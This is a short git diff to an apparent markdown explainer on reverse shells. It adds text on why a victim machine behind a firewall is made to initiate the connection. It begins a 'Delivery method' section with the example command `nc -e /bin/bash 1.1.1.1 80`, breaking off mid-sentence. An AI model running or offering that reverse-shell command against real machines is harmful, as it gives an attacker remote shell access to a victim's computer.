@@ -24,4 +24,8 @@ Normal shell session happen like following:
 
 ==> Now computer A can execute shell command on Computer B.
 
-If computer B is inside a private network without dedicated public IP or computer B is behind firewall ==> Computer A can not initiated connection to Computer B. However, connection initiated by Computer B is more likely to pass firewall
+If computer B is inside a private network without dedicated public IP or computer B is behind firewall ==> Computer A can not initiated connection to Computer B. However, connection initiated by Computer B is more likely to pass firewall and/or connect to Computer A (which has public IP and no firewall).
+
+# 3. Delivery method
+
+Reversed shell command (like `nc -e /bin/bash 1.1.1.1 80`) can be delivered to victim 
